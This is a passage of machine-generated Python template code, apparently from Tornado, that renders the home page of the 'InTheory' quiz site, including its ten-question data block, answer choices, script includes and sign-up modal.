124      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
125      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
126      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
127      _append(_tmp)  # home.html:21 (via base.html:76)
128      _append('", "')  # home.html:21 (via base.html:76)
129      _tmp = kwargs["questions"][2].options[1]  # home.html:21 (via base.html:76)
130      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
131      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
132      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
133      _append(_tmp)  # home.html:21 (via base.html:76)
134      _append('", "')  # home.html:21 (via base.html:76)
135      _tmp = kwargs["questions"][2].options[2]  # home.html:21 (via base.html:76)
136      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
137      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
138      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
139      _append(_tmp)  # home.html:21 (via base.html:76)
140      _append('", "')  # home.html:21 (via base.html:76)
141      _tmp = kwargs["questions"][2].options[3]  # home.html:21 (via base.html:76)
142      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
143      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
144      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
145      _append(_tmp)  # home.html:21 (via base.html:76)
146      _append('"],"answer": ')  # home.html:21 (via base.html:76)
147      _tmp = kwargs["questions"][2].answer  # home.html:21 (via base.html:76)
148      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
149      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
150      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
151      _append(_tmp)  # home.html:21 (via base.html:76)
152      _append('},{ "question":"')  # home.html:21 (via base.html:76)
153      _tmp = kwargs["questions"][3].question  # home.html:21 (via base.html:76)
154      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
155      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
156      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
157      _append(_tmp)  # home.html:21 (via base.html:76)
158      _append('","options": ["')  # home.html:21 (via base.html:76)
159      _tmp = kwargs["questions"][3].options[0]  # home.html:21 (via base.html:76)
160      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
161      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
162      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
163      _append(_tmp)  # home.html:21 (via base.html:76)
164      _append('", "')  # home.html:21 (via base.html:76)
165      _tmp = kwargs["questions"][3].options[1]  # home.html:21 (via base.html:76)
166      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
167      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
168      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
169      _append(_tmp)  # home.html:21 (via base.html:76)
170      _append('", "')  # home.html:21 (via base.html:76)
171      _tmp = kwargs["questions"][3].options[2]  # home.html:21 (via base.html:76)
172      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
173      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
174      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
175      _append(_tmp)  # home.html:21 (via base.html:76)
176      _append('", "')  # home.html:21 (via base.html:76)
177      _tmp = kwargs["questions"][3].options[3]  # home.html:21 (via base.html:76)
178      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
179      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
180      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
181      _append(_tmp)  # home.html:21 (via base.html:76)
182      _append('"],"answer": ')  # home.html:21 (via base.html:76)
183      _tmp = kwargs["questions"][3].answer  # home.html:21 (via base.html:76)
184      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
185      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
186      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
187      _append(_tmp)  # home.html:21 (via base.html:76)
188      _append('}, { "question":"')  # home.html:21 (via base.html:76)
189      _tmp = kwargs["questions"][4].question  # home.html:21 (via base.html:76)
190      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
191      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
192      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
193      _append(_tmp)  # home.html:21 (via base.html:76)
194      _append('","options": ["')  # home.html:21 (via base.html:76)
195      _tmp = kwargs["questions"][4].options[0]  # home.html:21 (via base.html:76)
196      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
197      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
198      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
199      _append(_tmp)  # home.html:21 (via base.html:76)
200      _append('", "')  # home.html:21 (via base.html:76)
201      _tmp = kwargs["questions"][4].options[1]  # home.html:21 (via base.html:76)
202      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
203      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
204      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
205      _append(_tmp)  # home.html:21 (via base.html:76)
206      _append('", "')  # home.html:21 (via base.html:76)
207      _tmp = kwargs["questions"][4].options[2]  # home.html:21 (via base.html:76)
208      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
209      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
210      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
211      _append(_tmp)  # home.html:21 (via base.html:76)
212      _append('", "')  # home.html:21 (via base.html:76)
213      _tmp = kwargs["questions"][4].options[3]  # home.html:21 (via base.html:76)
214      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
215      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
216      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
217      _append(_tmp)  # home.html:21 (via base.html:76)
218      _append('"],"answer": ')  # home.html:21 (via base.html:76)
219      _tmp = kwargs["questions"][4].answer  # home.html:21 (via base.html:76)
220      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
221      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
222      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
223      _append(_tmp)  # home.html:21 (via base.html:76)
224      _append('},{ "question":"')  # home.html:21 (via base.html:76)
225      _tmp = kwargs["questions"][5].question  # home.html:21 (via base.html:76)
226      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
227      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
228      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
229      _append(_tmp)  # home.html:21 (via base.html:76)
230      _append('","options": ["')  # home.html:21 (via base.html:76)
231      _tmp = kwargs["questions"][5].options[0]  # home.html:21 (via base.html:76)
232      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
233      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
234      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
235      _append(_tmp)  # home.html:21 (via base.html:76)
236      _append('", "')  # home.html:21 (via base.html:76)
237      _tmp = kwargs["questions"][5].options[1]  # home.html:21 (via base.html:76)
238      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
239      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
240      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
241      _append(_tmp)  # home.html:21 (via base.html:76)
242      _append('", "')  # home.html:21 (via base.html:76)
243      _tmp = kwargs["questions"][5].options[2]  # home.html:21 (via base.html:76)
244      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
245      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
246      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
247      _append(_tmp)  # home.html:21 (via base.html:76)
248      _append('", "')  # home.html:21 (via base.html:76)
249      _tmp = kwargs["questions"][5].options[3]  # home.html:21 (via base.html:76)
250      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
251      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
252      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
253      _append(_tmp)  # home.html:21 (via base.html:76)
254      _append('"],"answer": ')  # home.html:21 (via base.html:76)
255      _tmp = kwargs["questions"][5].answer  # home.html:21 (via base.html:76)
256      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
257      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
258      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
259      _append(_tmp)  # home.html:21 (via base.html:76)
260      _append('}, { "question":"')  # home.html:21 (via base.html:76)
261      _tmp = kwargs["questions"][6].question  # home.html:21 (via base.html:76)
262      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
263      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
264      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
265      _append(_tmp)  # home.html:21 (via base.html:76)
266      _append('","options": ["')  # home.html:21 (via base.html:76)
267      _tmp = kwargs["questions"][6].options[0]  # home.html:21 (via base.html:76)
268      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
269      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
270      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
271      _append(_tmp)  # home.html:21 (via base.html:76)
272      _append('", "')  # home.html:21 (via base.html:76)
273      _tmp = kwargs["questions"][6].options[1]  # home.html:21 (via base.html:76)
274      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
275      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
276      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
277      _append(_tmp)  # home.html:21 (via base.html:76)
278      _append('", "')  # home.html:21 (via base.html:76)
279      _tmp = kwargs["questions"][6].options[2]  # home.html:21 (via base.html:76)
280      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
281      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
282      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
283      _append(_tmp)  # home.html:21 (via base.html:76)
284      _append('", "')  # home.html:21 (via base.html:76)
285      _tmp = kwargs["questions"][6].options[3]  # home.html:21 (via base.html:76)
286      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
287      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
288      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
289      _append(_tmp)  # home.html:21 (via base.html:76)
290      _append('"],"answer": ')  # home.html:21 (via base.html:76)
291      _tmp = kwargs["questions"][6].answer  # home.html:21 (via base.html:76)
292      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
293      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
294      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
295      _append(_tmp)  # home.html:21 (via base.html:76)
296      _append('},{ "question":"')  # home.html:21 (via base.html:76)
297      _tmp = kwargs["questions"][7].question  # home.html:21 (via base.html:76)
298      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
299      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
300      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
301      _append(_tmp)  # home.html:21 (via base.html:76)
302      _append('","options": ["')  # home.html:21 (via base.html:76)
303      _tmp = kwargs["questions"][7].options[0]  # home.html:21 (via base.html:76)
304      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
305      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
306      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
307      _append(_tmp)  # home.html:21 (via base.html:76)
308      _append('", "')  # home.html:21 (via base.html:76)
309      _tmp = kwargs["questions"][7].options[1]  # home.html:21 (via base.html:76)
310      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
311      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
312      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
313      _append(_tmp)  # home.html:21 (via base.html:76)
314      _append('", "')  # home.html:21 (via base.html:76)
315      _tmp = kwargs["questions"][7].options[2]  # home.html:21 (via base.html:76)
316      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
317      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
318      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
319      _append(_tmp)  # home.html:21 (via base.html:76)
320      _append('", "')  # home.html:21 (via base.html:76)
321      _tmp = kwargs["questions"][7].options[3]  # home.html:21 (via base.html:76)
322      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
323      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
324      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
325      _append(_tmp)  # home.html:21 (via base.html:76)
326      _append('"],"answer": ')  # home.html:21 (via base.html:76)
327      _tmp = kwargs["questions"][7].answer  # home.html:21 (via base.html:76)
328      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
329      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
330      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
331      _append(_tmp)  # home.html:21 (via base.html:76)
332      _append('}, { "question":"')  # home.html:21 (via base.html:76)
333      _tmp = kwargs["questions"][8].question  # home.html:21 (via base.html:76)
334      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
335      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
336      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
337      _append(_tmp)  # home.html:21 (via base.html:76)
338      _append('","options": ["')  # home.html:21 (via base.html:76)
339      _tmp = kwargs["questions"][8].options[0]  # home.html:21 (via base.html:76)
340      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
341      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
342      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
343      _append(_tmp)  # home.html:21 (via base.html:76)
344      _append('", "')  # home.html:21 (via base.html:76)
345      _tmp = kwargs["questions"][8].options[1]  # home.html:21 (via base.html:76)
346      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
347      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
348      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
349      _append(_tmp)  # home.html:21 (via base.html:76)
350      _append('", "')  # home.html:21 (via base.html:76)
351      _tmp = kwargs["questions"][8].options[2]  # home.html:21 (via base.html:76)
352      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
353      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
354      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
355      _append(_tmp)  # home.html:21 (via base.html:76)
356      _append('", "')  # home.html:21 (via base.html:76)
357      _tmp = kwargs["questions"][8].options[3]  # home.html:21 (via base.html:76)
358      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
359      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
360      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
361      _append(_tmp)  # home.html:21 (via base.html:76)
362      _append('"],"answer": ')  # home.html:21 (via base.html:76)
363      _tmp = kwargs["questions"][8].answer  # home.html:21 (via base.html:76)
364      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
365      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
366      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
367      _append(_tmp)  # home.html:21 (via base.html:76)
368      _append('},{ "question":"')  # home.html:21 (via base.html:76)
369      _tmp = kwargs["questions"][9].question  # home.html:21 (via base.html:76)
370      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
371      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
372      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
373      _append(_tmp)  # home.html:21 (via base.html:76)
374      _append('","options": ["')  # home.html:21 (via base.html:76)
375      _tmp = kwargs["questions"][9].options[0]  # home.html:21 (via base.html:76)
376      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
377      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
378      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
379      _append(_tmp)  # home.html:21 (via base.html:76)
380      _append('", "')  # home.html:21 (via base.html:76)
381      _tmp = kwargs["questions"][9].options[1]  # home.html:21 (via base.html:76)
382      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
383      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
384      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
385      _append(_tmp)  # home.html:21 (via base.html:76)
386      _append('", "')  # home.html:21 (via base.html:76)
387      _tmp = kwargs["questions"][9].options[2]  # home.html:21 (via base.html:76)
388      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
389      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
390      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
391      _append(_tmp)  # home.html:21 (via base.html:76)
392      _append('", "')  # home.html:21 (via base.html:76)
393      _tmp = kwargs["questions"][9].options[3]  # home.html:21 (via base.html:76)
394      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
395      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
396      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
397      _append(_tmp)  # home.html:21 (via base.html:76)
398      _append('"],"answer": ')  # home.html:21 (via base.html:76)
399      _tmp = kwargs["questions"][9].answer  # home.html:21 (via base.html:76)
400      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
401      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
402      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
403      _append(_tmp)  # home.html:21 (via base.html:76)
404      _append('}]\'>\n</div>\n<div id="answers" data-answers=\'[]\'></div>\n<div id="mini-quiz-box" class="undimmed">\n')  # home.html:25 (via base.html:76)
405      question = kwargs['questions'][0]  # home.html:25 (via base.html:76)
406      _append('\n<h4> ')  # home.html:26 (via base.html:76)
407      _tmp = question.question  # home.html:26 (via base.html:76)
408      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:26 (via base.html:76)
409      else: _tmp = _utf8(str(_tmp))  # home.html:26 (via base.html:76)
410      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:26 (via base.html:76)
411      _append(_tmp)  # home.html:26 (via base.html:76)
412      _append('</h4>\n<ul remaining-answers=')  # home.html:27 (via base.html:76)
413      _tmp = len(question.answer)  # home.html:27 (via base.html:76)
414      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:27 (via base.html:76)
415      else: _tmp = _utf8(str(_tmp))  # home.html:27 (via base.html:76)
416      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:27 (via base.html:76)
417      _append(_tmp)  # home.html:27 (via base.html:76)
418      _append(' class="nav nav-pills nav-stacked">\n<li><a class="choice" ind="0"><span class="badge badge-info">A</span> ')  # home.html:28 (via base.html:76)
419      _tmp = question.options[0]  # home.html:28 (via base.html:76)
420      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:28 (via base.html:76)
421      else: _tmp = _utf8(str(_tmp))  # home.html:28 (via base.html:76)
422      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:28 (via base.html:76)
423      _append(_tmp)  # home.html:28 (via base.html:76)
424      _append('</a></li>\n<li><a class="choice" ind="1"><span class="badge badge-info">B</span> ')  # home.html:29 (via base.html:76)
425      _tmp = question.options[1]  # home.html:29 (via base.html:76)
426      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:29 (via base.html:76)
427      else: _tmp = _utf8(str(_tmp))  # home.html:29 (via base.html:76)
428      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:29 (via base.html:76)
429      _append(_tmp)  # home.html:29 (via base.html:76)
430      _append('</a></li>\n<li><a class="choice" ind="2"><span class="badge badge-info">C</span> ')  # home.html:30 (via base.html:76)
431      _tmp = question.options[2]  # home.html:30 (via base.html:76)
432      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:30 (via base.html:76)
433      else: _tmp = _utf8(str(_tmp))  # home.html:30 (via base.html:76)
434      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:30 (via base.html:76)
435      _append(_tmp)  # home.html:30 (via base.html:76)
436      _append('</a></li>\n<li><a class="choice" ind="3"><span class="badge badge-info">D</span> ')  # home.html:31 (via base.html:76)
437      _tmp = question.options[3]  # home.html:31 (via base.html:76)
438      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:31 (via base.html:76)
439      else: _tmp = _utf8(str(_tmp))  # home.html:31 (via base.html:76)
440      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:31 (via base.html:76)
441      _append(_tmp)  # home.html:31 (via base.html:76)
442      _append('</a></li>\n</ul>\n<a id="next" class="btn btn-success btn-mini disabled">Next Question</a>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class="row">\n<div class="span10">\n</div>\n<div class="span5 offset5">\n</br></br>\n<blockquote>\n<p>\n<h2><div class="funkytext"><font color="#ffffff">"')  # home.html:47 (via base.html:76)
443      _tmp = kwargs['tweet']  # home.html:47 (via base.html:76)
444      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:47 (via base.html:76)
445      else: _tmp = _utf8(str(_tmp))  # home.html:47 (via base.html:76)
446      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:47 (via base.html:76)
447      _append(_tmp)  # home.html:47 (via base.html:76)
448      _append('"</h2>\n<div class="funkytext">- Dave Mason, London</font></div>\n</p>\n</blockquote>\n</div>\n</div>\n</div> <!-- /container -->\n<div id="dim">\n</div>\n')  # home.html:57 (via base.html:76)
449      _append('\n')  # base.html:80
450      _tmp = xsrf_form_html()  # base.html:80
451      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80
452      else: _tmp = _utf8(str(_tmp))  # base.html:80
453      _append(_tmp)  # base.html:80
454      _append('\n')  # base.html:81
455      _append('\n<script src="')  # base.html:82 (via base.html:81)
456      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:82 (via base.html:81)
457      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:82 (via base.html:81)
458      else: _tmp = _utf8(str(_tmp))  # base.html:82 (via base.html:81)
459      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:82 (via base.html:81)
460      _append(_tmp)  # base.html:82 (via base.html:81)
461      _append('"></script>\n<script src="')  # base.html:83 (via base.html:81)
462      _tmp = static_url('js/libs/blurb.min.js')  # base.html:83 (via base.html:81)
463      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:83 (via base.html:81)
464      else: _tmp = _utf8(str(_tmp))  # base.html:83 (via base.html:81)
465      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:83 (via base.html:81)
466      _append(_tmp)  # base.html:83 (via base.html:81)
467      _append('"></script>\n<script src="')  # base.html:84 (via base.html:81)
468      _tmp = static_url('js/IT.js')  # base.html:84 (via base.html:81)
469      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:84 (via base.html:81)
470      else: _tmp = _utf8(str(_tmp))  # base.html:84 (via base.html:81)
471      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:84 (via base.html:81)
472      _append(_tmp)  # base.html:84 (via base.html:81)
473      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:88 (via base.html:81)
474      _append('\n')  # base.html:90
475      for js in kwargs['js_deps']:  # base.html:90
476          _append('\n<script src="')  # base.html:91
477          _tmp = static_url(js)  # base.html:91
478          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:91
479          else: _tmp = _utf8(str(_tmp))  # base.html:91
480          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:91
481          _append(_tmp)  # base.html:91
482          _append('"></script>\n')  # base.html:92
483      _append('\n')  # base.html:94
484      _append('\n<script id="signup-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<p>You still need a little practice, but don\'t worry we\'re here to help you pass. Sign-up today to get started...</p>\n<a href="/login"><center><img src="')  # home.html:68 (via base.html:94)
485      _tmp = static_url('imgs/facebook.png')  # home.html:68 (via base.html:94)
486      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:68 (via base.html:94)
487      else: _tmp = _utf8(str(_tmp))  # home.html:68 (via base.html:94)
488      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:68 (via base.html:94)
489      _append(_tmp)  # home.html:68 (via base.html:94)
490      _append('" alt="some_text"/></a>\n<img src="')  # home.html:69 (via base.html:94)
491      _tmp = static_url('imgs/twitter.png')  # home.html:69 (via base.html:94)
492      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:69 (via base.html:94)
493      else: _tmp = _utf8(str(_tmp))  # home.html:69 (via base.html:94)
494      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:69 (via base.html:94)
495      _append(_tmp)  # home.html:69 (via base.html:94)
496      _append('" alt="some_text"/>\n<img src="')  # home.html:70 (via base.html:94)
497      _tmp = static_url('imgs/google.png')  # home.html:70 (via base.html:94)
498      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:70 (via base.html:94)
499      else: _tmp = _utf8(str(_tmp))  # home.html:70 (via base.html:94)
500      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:70 (via base.html:94)
501      _append(_tmp)  # home.html:70 (via base.html:94)
502      _append('" alt="some_text"/></center>\n<center><a href="h">Or click here to sign-up directly</a></center>\n</div>\n<div class="modal-footer">\n<ul class="pager">\n<li class="previous"><a href="#">Sign in to InTheory</a></li>\n<li class="next"><a href="#">Forgot username or password?</a></li>\n</ul>\n</div>\n</div>\n</script>\n<script id="show-arrow-template" type="text/x-jquery-tmpl">\n<div class="arrow-container">\n<img src="')  # home.html:84 (via base.html:94)
503      _tmp = static_url('imgs/arrow.png')  # home.html:84 (via base.html:94)
504      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:84 (via base.html:94)
505      else: _tmp = _utf8(str(_tmp))  # home.html:84 (via base.html:94)
506      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:84 (via base.html:94)
507      _append(_tmp)  # home.html:84 (via base.html:94)
